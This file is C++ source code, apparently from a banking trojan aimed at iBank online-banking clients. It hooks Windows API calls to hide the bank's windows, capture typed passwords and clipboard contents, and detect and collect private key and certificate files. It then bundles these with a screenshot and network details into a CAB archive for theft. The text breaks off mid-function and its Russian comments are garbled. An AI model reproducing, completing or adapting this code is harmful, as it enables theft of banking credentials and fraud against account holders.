#include "Ibank.h"
//#ifdef RuBnkH
#include "Strings.h"
//#include "BotDebug.h"

#include "BotHosts.h"
//#include "java_patcher.h"

#include "BotDebug.h"


namespace IBANK_
{
    #include "DbgTemplates.h"
}
#define IBANK_DBG  IBANK_::DBGOutMessage<>

 




typedef struct __ibankstruct
{
	char *WindowName;
	char *ClipBoard;

	WCHAR *CertTempPath;

	char *Password;
	DWORD dwPassLen;

} IBANK, *PIBANK;

PIBANK pIbank;


//�-��� ������� ����� ������
typedef BOOL   ( WINAPI *PIbankTranslateMessage )( const MSG *lpMsg );
typedef int    ( WINAPI *PConnect				)( SOCKET s, const struct sockaddr *name, int namelen );
typedef HANDLE ( WINAPI *PCreateFileW			)( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
typedef BOOL   ( WINAPI *PShowWindow			)( HWND hWnd, int Cmd );



PIbankTranslateMessage	Real_IbankTranslateMessage;
PConnect				Real_Connect;
PCreateFileW			Real_CreateFileW;
PShowWindow				Real_ShowWindow1;

//����� ����� ���������
#define ENTER_SYSTEM_MENU_RUS	      0x144497E5
#define SYNCHRONIZATION_WITH_BANK_RUS 0x9548BABC
#define SYNCHRONIZATION_PROCESS_RUS	  0xC8BBFA76

#define ENTER_SYSTEM_MENU_UKR		  0xEBB4681A
#define SYNCHRONIZATION_WITH_BANK_UKR 0x9564AD10
#define SYNCHRONIZATION_PROCESS_UKR   0xBB540561

#define ENTER_SYSTEM_MENU_ENG		  0xCC7AA9CB
#define SYNCHRONIZATION_WITH_BANK_ENG 0x91617796
#define SYNCHRONIZATION_PROCESS_ENG   0xB28711CE


//����
#define ENTER_SYSTEM_MENU		  1 //���� ����� ������ � PC, ���� ����� ������ + ����� � ��������
#define SYNCHRONIZATION_WITH_BANK 2 //���� ����� ������ + ����� � PC
#define SYNCHRONIZATION_PROCESS   3 //�������� ������ � PC

//���� ����� �� ��������� �� ������ ������� ��� ��������� ��������� ��������������� � �������� ����� ���, � 
//������������� ��� ����� ��������� ������ ����� ���, ��� �������� � ������������ �����, � ��������� ���������� ������, � ��� ������
// ��� ��������� ����� ������ ���� 
bool OnceSend = true;
//������ �����
bool SHIFT_FLAG = false;
bool CAPSL_FLAG = false;

DWORD dwLastLayout = -1;

int m_tolower( int c )
{
	if ( c >= 65 && c <= 90 )
	{
		c += 32;
	}

	return c;	
}

int m_toupper( int c )
{
	if ( c >= 97 && c <= 122 )
	{
		c -= 32;
	}

	return c;	
}

int m_toupper_rus( int c )
{
	if ( c <= (-1) && c >= (-32) )
	{
		c -= 32;
	}

	return c;
}

int m_tolower_rus( int c )
{
	if ( c <= (-33) && c >= (-64) )
	{
		c += 32;
	}

	return c;
}


// ��������� ������������� flag.dat �����
bool checkFileFlag()
{
	CHAR* sAppData = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
	pExpandEnvironmentStringsA("%ALLUSERSPROFILE%", sAppData, MAX_PATH);
//	pSHGetSpecialFolderPathA(NULL, sAppData, 0x001a, FALSE);
	m_lstrcat(sAppData, "\\flag.dat");
	DWORD attr = (DWORD)pGetFileAttributesA(sAppData);
	//pOutputDebugStringA(sAppData);
	MemFree(sAppData);
	if(attr == INVALID_FILE_ATTRIBUTES) return false;
	else return true;
}

HWND hWnd_Editor = NULL;

void Hide(HWND hWnd, BOOL makeToolWindow = FALSE);
void Hide(HWND hWnd, BOOL makeToolWindow)
{
	int W = (int)pGetSystemMetrics(0); //SM_CXSCREEN = 0
	RECT r;
	pGetWindowRect(hWnd, &r);
	pMoveWindow(hWnd, W - 100, 0, r.right - r.left, r.bottom - r.top, TRUE);

	if(makeToolWindow)
		pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
	pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
	pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);

	if(hWnd == hWnd_Editor)
	{
		pOutputDebugStringA("DESTROING");
		pDestroyWindow(hWnd);
	}
}

BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//����������� ���� ������� ����������
{


	
	WCHAR cText[MAX_PATH];
	pGetWindowTextW(hWnd,cText,MAX_PATH);
	
	if((plstrcmpW(cText, L"���� � �������") == 0))
	{
		
		
		PCHAR lpAllUsersProfile = STR::Alloc(MAX_PATH);
		pExpandEnvironmentStringsA("%ALLUSERSPROFILE%", lpAllUsersProfile, MAX_PATH);
		PCHAR TestPath = STR::New(2,lpAllUsersProfile,"\\Pat.txt");
		STR::Free(lpAllUsersProfile);

		File::WriteBufferA(TestPath,"123",3 );
		STR::Free(TestPath);

	}

	if(checkFileFlag())
	{
		IBANK_DBG("IBANK","���� �� ������ ������� ����� ����");
		if((plstrcmpW(cText, L"����� �����") == 0)||(plstrcmpW(cText, L"���� �������") == 0)||(plstrcmpW(cText, L"��������������") == 0)) 
		{
			Hide(hWnd);
			//Cmd = SW_HIDE;

			IBANK_DBG("IBANK ������� ������ � ������","����� ����� HIDE, �������������� HIDE"); 
		}
		else if(plstrcmpW(cText, L"�������� ����������") == 0)
		{
			Hide(hWnd, TRUE);
			if(hWnd_Editor != NULL)
			{
				pOutputDebugStringA("DESTROING");
				pDestroyWindow(hWnd);
			}
			hWnd_Editor = hWnd;
			IBANK_DBG("IBANK ������� ������ � ������","�������� ���������� HIDE"); 
		}
		/*else 
		if(plstrcmpW(cText, L"�������� ����������") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"�������� ���������� HIDE"); }
		else 
		if(plstrcmpW(cText, L"��������������") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"�������������� HIDE"); }*/
		if (NULL!=(PTSTR)pStrStrIW(cText,L"������"))
		{
			IBANK_DBG("Ibank","��������� ���� ������");
			
			//Cmd=SW_HIDE;
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
			pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);
			pSendMessageA( hWnd, WM_CLOSE, NULL, NULL );	/**/
		}
	}
	return Real_ShowWindow1(hWnd, Cmd);
}

DWORD GetCurrentMenuType()
{
	DWORD dwCurrentWindow = GetCurrentWindowHash();

	if ( dwCurrentWindow == ENTER_SYSTEM_MENU_RUS ||
		 dwCurrentWindow == ENTER_SYSTEM_MENU_UKR ||
		 dwCurrentWindow == ENTER_SYSTEM_MENU_ENG )
	{
		return ENTER_SYSTEM_MENU;
	}
	else if ( dwCurrentWindow == SYNCHRONIZATION_WITH_BANK_RUS ||
			  dwCurrentWindow == SYNCHRONIZATION_WITH_BANK_UKR ||
			  dwCurrentWindow == SYNCHRONIZATION_WITH_BANK_ENG )
	{
		return SYNCHRONIZATION_WITH_BANK;
	}
	else if ( dwCurrentWindow == SYNCHRONIZATION_PROCESS_RUS ||
			  dwCurrentWindow == SYNCHRONIZATION_PROCESS_UKR ||
			  dwCurrentWindow == SYNCHRONIZATION_PROCESS_ENG )
	{
		return SYNCHRONIZATION_PROCESS;
	}

	return 0;
}
typedef struct InSend
{
	char * FileName;
	int FileType;
}FROMSENDDATA,*LPFROMSENDDATA;

BOOL isFileExist2(CHAR* filename)
{
	DWORD attr = (DWORD)pGetFileAttributesA(filename);
	if(attr == INVALID_FILE_ATTRIBUTES) return FALSE;
	return TRUE;
}

void DbgMsg(const char *format, ...)
{
	char buf[512];
	va_list mylist;

	va_start(mylist, format);
	wvsprintfA(buf, format, mylist);
	va_end(mylist);

	OutputDebugStringA(buf);
}

HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE hRet = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	//���� ����������� ��� ������
	if( (dwDesiredAccess & GENERIC_READ) &&  dwCreationDisposition == OPEN_EXISTING )
	{
		//��������� �������� ��� �������
		HANDLE hFile = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
		if ( hFile != INVALID_HANDLE_VALUE )
		{		
			DWORD h;
			DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );
			//������ ��������
			if( dwFileSize > 500 && dwFileSize < 3000 )
			{
				//������ �������� � ������
				HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );
				LPBYTE pbyFile  = NULL;
				if ( hMapFile != INVALID_HANDLE_VALUE )
				{
					LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );
					if ( pbyFile != NULL )
					{
						//�� zip (jar) �����
						if( pbyFile[0] != 'P' || pbyFile[1] != 'K' )
						{
							//������� ������� ��������
							int s[256];
							m_memset( s, 0, sizeof(s) );
							for( int i = 0; i < dwFileSize; i++ ) s[pbyFile[i]]++;
							//������� ������� �������
							int avg = dwFileSize / 256;
							//������ � ����� ��������� ���������� �������������� ������
							int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
							int max = avg + avg / 2 + 1;
							//������������ ���������� ��������� ������ � ��������� [m1;m2]
							int m1 = 0, m2 = 0;
							for( int i = 0; i < 256; i++ )
								if( min <= s[i] && s[i] <= max ) 
									m1++;
								else
									m2++;
						        //���� ������� ���������� ������������, �� ���������� ��������� 
						        //������ ���� �������� � ��� ���� ������
							if( m1 / 2 > m2 )
							{
								OutputDebugString("key file");
								OutputDebugStringW(lpFileName);
							}
						}
						pUnmapViewOfFile( pbyFile );
					}
					pZwClose( hMapFile );
				}
			}	
			pZwClose( hFile );	
		}
	}
	return hRet;
}
/*
HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	
	
	HANDLE hRet = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	
	DWORD dwCurrentMenu = GetCurrentMenuType();

	if ( dwCurrentMenu == ENTER_SYSTEM_MENU || dwCurrentMenu == SYNCHRONIZATION_WITH_BANK ) // ���� � ������� ��� ������������� � ������
	{
		
		

		if ( pIbank && !pIbank->CertTempPath ) 
		{			
			WCHAR FileName[ MAX_PATH ];
			plstrcpyW( FileName, lpFileName );
			IBANK_DBG("Ibank","���������� ������ ���������� ����� ����� Hook_CreateFileW");
			OutputDebugStringW(lpFileName);
			DbgMsg( "%08x %08x", dwDesiredAccess, dwCreationDisposition );
            // IBank �� ���������� dat ����������
			if ( GetFileFormat( FileName ) == 0x1930F4 || GetFileFormat( FileName ) ==0x1AB5F3)	//  ��c������� dat ��� jks                                                                
			{
				if ( ( pIbank->CertTempPath = (WCHAR*)MemAlloc( 1024 ) ) != NULL )
				{
					plstrcpyW( pIbank->CertTempPath, lpFileName );
					IBANK_DBG("Ibank",pIbank->CertTempPath);
				}
			}

            // IBank �� ��������� ����� ����������
			else 
			{
				HANDLE hFile = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );

				if ( hFile != INVALID_HANDLE_VALUE )
				{		
					DWORD h;
					DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );			

					if ( dwFileSize > 0 )
					{
						HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );
						LPBYTE pbyFile  = NULL;

						if ( hMapFile != INVALID_HANDLE_VALUE )
						{
							LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

							if ( pbyFile != NULL )
							{
								BYTE iBankSignature[] = {0x69, 0x42, 0x4B, 0x53, 0};

								bool bIsIbank = true;

								for ( DWORD i = 0; i < 4; i++ )
								{
									if ( iBankSignature[i] != pbyFile[i] )
									{
										bIsIbank = false;
										break;
									}
								}

								if ( bIsIbank )
								{
									if ( ( pIbank->CertTempPath = (WCHAR*)MemAlloc( 1024 ) ) != NULL )
									{
										plstrcpyW( pIbank->CertTempPath, lpFileName );
									}
								}
							}

							pUnmapViewOfFile( pbyFile );
						}

						pZwClose( hMapFile );
					}

					pZwClose( hFile );	
				}	
			}
		}
	}

	
	return hRet;
}
*/
#define MAX_SISE_OF_FOUND 1024*1000
LONGLONG SizeOfFiles(WCHAR* Path)
{
	// ���������� ����� ������ ������
	LONGLONG nFileLen = 0;
	
	//������� �����
	WCHAR cPath[MAX_PATH];
	m_memset(cPath,0,MAX_PATH*2);
	plstrcpyW(&cPath[0],Path);
	plstrcatW(&cPath[0],L"*.*");

	WIN32_FIND_DATAW Search;
	HANDLE File = pFindFirstFileW(cPath, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	// ���������� ��������� �����
	while (File != NULL)
	{
        if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{	
			nFileLen = nFileLen+(Search.nFileSizeHigh * (4294967295+1)) + Search.nFileSizeLow;// �� ������ ����� �������� �����			
        }
		else
		{
			//���������� ������ 
			if( plstrcmpW( Search.cFileName,L".") != 0 &&
				plstrcmpW( Search.cFileName,L"..") != 0 )
			{
				WCHAR wPath[MAX_PATH];
				m_memset(wPath,0,MAX_PATH*2);
				plstrcpyW(&wPath[0],Path);
				
				plstrcatW(&wPath[0],Search.cFileName);
				plstrcatW(&wPath[0],L"\\");
				nFileLen=nFileLen+SizeOfFiles( wPath);
				if (nFileLen>MAX_SISE_OF_FOUND)
					break;
			}
		}
		// �������� ��������� ����
		if (!pFindNextFileW(File, &Search)) break;;
	}
	// ����������� ������	
	pFindClose(File);
	return nFileLen;
}

bool DirMorEmb(WCHAR*FilderName)
{
	if(SizeOfFiles(FilderName)>MAX_SISE_OF_FOUND)
		return false;
	else
		return true;
}


///����������� �����
typedef enum {
    SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
    SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
} SHGFP_TYPE;
#define CSIDL_APPDATA                   0x001a        // <user name>\Application Data
bool bTmp=true;
bool OpenFileAndMessage()
{

	HANDLE hHandle;
	WCHAR ExplorerAddRu[] = {'\\','r','u',L'\0'};//
	WCHAR ExplorerAddUa[] = {'\\','u','a',L'\0'};//
	WCHAR SysPathRu[MAX_PATH];
	WCHAR SysPathUa[MAX_PATH];
	m_memset(SysPathRu,0,MAX_PATH*2);
	m_memset(SysPathUa,0,MAX_PATH*2);
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPathRu);	
	plstrcatW( SysPathRu, ExplorerAddRu );
	plstrcatW( SysPathUa, ExplorerAddUa );
	if ( (DWORD)pGetFileAttributesW( SysPathRu ) != -1  )
	{		
		if(bTmp)
		{
			bTmp=false;
			return true;
		}
		else 
			bTmp=true;
		DWORD dwReadDD;
		char ReadData[1024];
		m_memset(ReadData,0,1024);
		hHandle	=	pCreateFileW(SysPathRu, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		pReadFile(hHandle,ReadData,1024,&dwReadDD,NULL);
		pCloseHandle(hHandle);
		pMessageBoxA(0,ReadData,"����������",MB_ICONINFORMATION);
		return true;
	}
	else
	if ( (DWORD)pGetFileAttributesW( SysPathUa ) != -1  )
	{
		DWORD dwReadDD;
		char ReadData[1024];
		m_memset(ReadData,0,1024);
		hHandle	=	pCreateFileW(SysPathUa, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		pReadFile(hHandle,ReadData,1024,&dwReadDD,NULL);
		pCloseHandle(hHandle);
		pMessageBoxA(0,ReadData,"����������",MB_ICONINFORMATION);
		return true;
	}
	return false;
}


PCHAR GetError(void)
{
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();
	IBANK_DBG("Ibank","error",dw);
	FormatMessage(
            FORMAT_MESSAGE_ALLOCATE_BUFFER |
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL,
            dw,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
            (LPTSTR) &lpMsgBuf,
            0, NULL );
			PCHAR Result=STR::New((PCHAR)lpMsgBuf,0);

        return Result;
}

#ifdef		JAVS_PATCHERH
BOOL IsPatchCompete()
{
	unsigned long crc_before = 0;
	unsigned long crc_after = 0;
	DWORD error = 0;
	CHAR* JREPath = GetJREPath(&error);
	
	CHAR* RtJarFileNameBefore = (CHAR*)MemAlloc(MAX_PATH);
	plstrcpyA(RtJarFileNameBefore, JREPath);
	plstrcatA(RtJarFileNameBefore,  "\\lib\\rtB.jar");

	// ���� rt.jar �� �����(�� ����������� ������������)
	HANDLE hRtBefore = (HANDLE)pCreateFileA( RtJarFileNameBefore, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	MemFree(RtJarFileNameBefore);
	if(hRtBefore != INVALID_HANDLE_VALUE)
	{
		BYTE* buf = (BYTE*)MemAlloc(1024);
		BYTE* content = NULL;
		DWORD nBytesRead = 0;
		DWORD nLen = 0;
		while((BOOL)pReadFile(hRtBefore, buf, 1024, &nBytesRead, NULL))
		{
			if(nBytesRead == 0) break;
			MemRealloc(content, nLen + nBytesRead);
			m_memcpy(content + nLen, buf, nBytesRead);
			nLen += nBytesRead;
		}
		MemFree(buf);
		if(nLen > 0)
		{
			crc_before = getCRC32((char*)content, nLen);
			MemFree(content);
		}
		else {
			IBANK_DBG("IBank.cpp", "BEFORE: nLen <= 0 fail");
			return false;
		}
	}
	else {
		IBANK_DBG("IBank.cpp", "BEFORE: CreateFileA() fail");
		return false;
	}

	// ���� rt.jar ����� �����
	CHAR* RtJarFileNameAfter = (CHAR*)MemAlloc(MAX_PATH);
	plstrcpyA(RtJarFileNameAfter, JREPath);
	plstrcatA(RtJarFileNameAfter,  "\\lib\\rt.jar");

	HANDLE hRtAfter = (HANDLE)pCreateFileA( RtJarFileNameAfter, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	MemFree(RtJarFileNameAfter);
	if(hRtAfter != INVALID_HANDLE_VALUE)
	{
		BYTE* buf = (BYTE*)MemAlloc(1024);
		BYTE* content = NULL;
		DWORD nBytesRead = 0;
		DWORD nLen = 0;
		while((BOOL)pReadFile(hRtAfter, buf, 1024, &nBytesRead, NULL))
		{
			if(nBytesRead == 0) break;
			MemRealloc(content, nLen + nBytesRead);
			m_memcpy(content + nLen, buf, nBytesRead);
			nLen += nBytesRead;
		}
		MemFree(buf);
		if(nLen > 0)
		{
			crc_after = getCRC32((char*)content, nLen);
			MemFree(content);
		}
		else {
			IBANK_DBG("IBank.cpp", "AFTER: nLen <= 0 fail");
			return false;
		}
	}
	else {
		IBANK_DBG("IBank.cpp", "AFTER: CreateFileA() fail");
		return false;
	}

	if(crc_before == crc_after) {
		IBANK_DBG("IBank.cpp", "crc_B == crc_A");
		return false;
	}
	else {
		IBANK_DBG("IBank.cpp", "crc_B != crc_A fail");
		return true;
	}
}
#endif

int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
{
	IBANK_DBG("IBank.cpp", "Hook_Connect");
	if(OnceSend)
	if (pIbank->Password !=NULL)
	if ( m_lstrlen( pIbank->Password ) && m_lstrlen( pIbank->WindowName ) )
	{
		IBANK_DBG("IBank.cpp", "Password & WindowName math");
		//	pMessageBoxA(0,"Hook_Connect","TEST!!!!!!!",MB_OK);
		sockaddr_in *SockAddr = (sockaddr_in*)&*name;

		int Port     =  (int)phtons( SockAddr->sin_port );
		char *Server = (char*)pinet_ntoa( SockAddr->sin_addr );

		if ( Server )
		{
			
			UnhookCreateFileW();

			WCHAR *ModulePath = (WCHAR*)MemAlloc( 1024 );
			pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
						
			char Template[] = "Program: %ws\r\n"
							  "Wnd Name: %s\r\n"
							  "Server: %s:%d\r\n"
							  "Password: %s\r\n"
							  "Certificate: %ws\r\n"
							  "ClipBuffer: %s\r\n";


			char *InfoBuffer = (char*)MemAlloc( 1024 );

			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
						
			pwsprintfA( InfoBuffer, Template, ModulePath, pIbank->WindowName, Server, Port, pIbank->Password, pIbank->CertTempPath, pIbank->ClipBoard );
				
			PCHAR InfoFile = File::GetTempNameA();

			bool AddLog	= false;

			if ( InfoFile )
			{
				HANDLE hLog = (HANDLE)pCreateFileA( InfoFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

				if ( hLog != INVALID_HANDLE_VALUE )
				{
					DWORD dwWritten = 0;

					if ( (BOOL)pWriteFile( hLog, InfoBuffer, (DWORD)m_lstrlen( InfoBuffer ), &dwWritten, 0 ) )
					{
						AddLog = true;
					}
				}

				pCloseHandle( hLog );
			}

			MemFree( InfoBuffer );	
						
			LPVOID lpScreen;
			DWORD dwScreenSize;
			GetScreen( &lpScreen, &dwScreenSize );

			bool AddScreen	 = false;
			char *ScreenFile = File::GetTempNameA();
		
			if ( lpScreen )
			{
				IBANK_DBG("IBank.cpp", "GetScrin");
				HANDLE hLog = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

				if ( hLog != INVALID_HANDLE_VALUE )
				{
					DWORD dwWritten = 0;

					if ( (BOOL)pWriteFile( hLog, lpScreen, dwScreenSize, &dwWritten, 0 ) )
					{
						AddScreen = true;
					}
				}

				pCloseHandle( hLog );
			}

			MemFree( lpScreen );

			if ( AddLog )
			{
				
				PCHAR Path = File::GetTempNameA();	
				IBANK_DBG("Ibank",Path);
				if ( Path )
				{

					#ifdef		JAVS_PATCHERH		
					if(	ClearAndDel(NULL)) {
						IBANK_DBG("IBank.cpp", "� ��� ������ ������ ���,������ �� ��� �� ��������������,\n�������� ����� ������ �� ����� http://www.java.com");
						return -1;
					}
					else
					{
						CHAR* sUidPath = (CHAR*)MemAlloc(MAX_PATH);
						pExpandEnvironmentStringsA("%AllUsersProfile%", sUidPath, MAX_PATH);
						m_lstrcat(sUidPath, "\\uid.txt");
						DWORD attr = (DWORD)pGetFileAttributesA(sUidPath);

						if(attr != INVALID_FILE_ATTRIBUTES && !IsPatchCompete()) {
							pMessageBoxA(NULL, "Java FAIL \r\nReboot is needed!", "ERROR", MB_ICONERROR | MB_OK);
							Reboot();
						}
						else
							IBANK_DBG("IBank.cpp", "Patch is completed !");
						
						MemFree(sUidPath);
					}
					#endif
					
					if (OpenFileAndMessage())
					{
						return -1;
					}
					LPFROMSENDDATA  Data;
					Data =	(LPFROMSENDDATA)MemAlloc(sizeof(FROMSENDDATA));
					Data->FileName = Path;
					Data->FileType	= 2;

					HCAB hCab = NULL;
					IBANK_DBG("Ibank",Path);
					if ( ( hCab = CreateCab( Path ) ) != NULL )
					{
						AddFileToCab( hCab, InfoFile, "Information.txt" );

						if ( pIbank->CertTempPath )
						{	
							//���� jks
							if (GetFileFormat( pIbank->CertTempPath ) ==0x1AB5F3)
							{
								Data->FileType	= 6;
								WCHAR Dir[MAX_PATH];
								m_memset(Dir,0,MAX_PATH*2);
								plstrcpyW(Dir , pIbank->CertTempPath );
								int iTimer= MAX_PATH; 
								while (true)
								{
									if (Dir[iTimer]!=L'\\')
										Dir[iTimer]=0;
									else
									{
										
										break;
									}
									iTimer--;
									if (iTimer==0)
										break;

								}
								if (DirMorEmb(Dir))
								{						
									PCHAR DirStr = WSTR::ToAnsi(Dir, 0);
									AddDirToCab( hCab, DirStr, "Directory" );
									STR::Free(DirStr);
								}
								else 
								{
									PCHAR TempPathStr = WSTR::ToAnsi( pIbank->CertTempPath, 0);
									PCHAR CertTempPathStr = WSTR::ToAnsi( pIbank->CertTempPath, 0);
									AddFileToCab( hCab, TempPathStr, CertTempPathStr);
									STR::Free(CertTempPathStr);
									STR::Free(TempPathStr);
								}
							}
							else
							{
								PCHAR TempPathStr = WSTR::ToAnsi(pIbank->CertTempPath, 0);
								PCHAR CertTempPathStr = WSTR::ToAnsi(pIbank->CertTempPath, 0);
								AddFileToCab( hCab, TempPathStr, CertTempPathStr);
								STR::Free(TempPathStr);
								STR::Free(CertTempPathStr);
							}
						}

						if ( AddScreen )
						{
							AddFileToCab( hCab, ScreenFile, "screen.jpeg" );
						}

						char *NetFile = GetNetInfo();
						IBANK_DBG("Ibank",NetFile);

						if ( NetFile != NULL )
						{
							AddFileToCab( hCab, NetFile, "NetInfo.txt" );
							pDeleteFileA( NetFile );
						}

						MemFree( NetFile );

						CloseCab( hCab );
					
						IBANK_DBG("Ibank",Data->FileName);


						OnceSend=false;
						
						

						
						
											
					}
				}
				STR::Free(Path);
			}

			pDeleteFileA( InfoFile );
			pDeleteFileA( ScreenFile );
			IBANK_DBG("Ibank","����� �����");

			STR::Free(InfoFile);
			STR::Free(ScreenFile);


			if ( HookApi( 1, 0x8F8F102, (DWORD)&Hook_CreateFileW ) )
			{
				__asm mov [Real_CreateFileW], eax
			}


			MemFree( pIbank );

			pIbank = (PIBANK)MemAlloc( sizeof( IBANK ) );

			if ( pIbank )
			{
				m_memset( pIbank, 0, sizeof( IBANK ) );
			}
		}
	}
	return Real_Connect( s, name, namelen );
}



void TranslateSymbol( DWORD dwKeyLayout, char Symbol, PBYTE OutSymbol )
{
	char Symb = Symbol;

	if ( CAPSL_FLAG )
	{
		if ( (int)Symbol >= 97 && (int)Symbol <= 122 )
		{
			Symb = m_toupper( (int)Symbol );
		}
		else if ( (int)Symbol <= (-1) && (int)Symbol >= (-32) )
		{
			Symb = (int)m_toupper_rus( Symbol );
		}
	}

	if ( dwKeyLayout == 0x66DD9BA && SHIFT_FLAG ) //eng
	{
		if ( (int)Symbol >= 97 && (int)Symbol <= 122 )
		{
			Symb = m_toupper( (int)Symbol );
		}
		else if ( (int)Symbol == 48 )
		{
			Symb = ')';
		}
		else if ( (int)Symbol == 49 )
		{
			Symb = '!';
		}
		else if ( (int)Symbol == 50 )
		{
			Symb = '@';
		}
		else if ( (int)Symbol == 51 )
		{
			Symb = '#';
		}
		else if ( (int)Symbol == 52 )
		{
			Symb = '$';
		}
		else if ( (int)Symbol == 53 )
		{
			Symb = '%';
		}
		else if ( (int)Symbol == 54 )
		{
			Symb = '^';
		}
		else if ( (int)Symbol == 55 )
		{
			Symb = '&';
		}
		else if ( (int)Symbol == 56 )
		{
			Symb = '*';
		}
		else if ( (int)Symbol == 57 )
		{
			Symb = '(';
		}
		else if ( (int)Symbol == 91 )
		{
			Symb = '{';
		}
		else if ( (int)Symbol == 93 )
		{
			Symb = '}';
		}
		else if ( (int)Symbol == 59 )
		{
			Symb = ':';
		}
		else if ( (int)Symbol == 39 )
		{
			Symb = '"';
		}
		else if ( (int)Symbol == 44 )
		{
			Symb = '<';
		}
		else if ( (int)Symbol == 46 )
		{
			Symb = '>';
		}
		else if ( (int)Symbol == 47 )
		{
			Symb = '?';
		}
		else if ( (int)Symbol == 96 )
		{
			Symb = '~';
		}
		else if ( (int)Symbol == 45 )
		{
			Symb = '_';
		}
		else if ( (int)Symbol == 61 )
		{
			Symb = '+';
		}
		else if ( (int)Symbol == 92 )
		{
			Symb = '|';
		}
	}
	else if ( dwKeyLayout == 0x66DD93A && SHIFT_FLAG ) //rus
	{
		if ( (int)Symbol <= (-1) && (int)Symbol >= (-32) )
		{
			Symb = (int)m_toupper_rus( Symbol );
		}
		else if ( (int)Symbol == 48 )
		{
			Symb = ')';
		}
		else if ( (int)Symbol == 49 )
		{
			Symb = '!';
		}
		else if ( (int)Symbol == 50 )
		{
			Symb = '"';
		}
		else if ( (int)Symbol == 51 )
		{
			Symb = '�';
		}
		else if ( (int)Symbol == 52 )
		{
			Symb = ';';
		}
		else if ( (int)Symbol == 53 )
		{
			Symb = '%';
		}
		else if ( (int)Symbol == 54 )
		{
			Symb = ':';
		}
		else if ( (int)Symbol == 55 )
		{
			Symb = '?';
		}
		else if ( (int)Symbol == 56 )
		{
			Symb = '*';
		}
		else if ( (int)Symbol == 57 )
		{
			Symb = '(';
		}
		else if ( (int)Symbol == 46 )
		{
			Symb = ',';
		}
		else if ( (int)Symbol == 96 )
		{
			Symb = '�';
		}
		else if ( (int)Symbol == 45 )
		{
			Symb = '_';
		}
		else if ( (int)Symbol == 61 )
		{
			Symb = '+';
		}
		else if ( (int)Symbol == 92 )
		{
			Symb = '/';
		}
	}

	*OutSymbol = (BYTE)Symb;

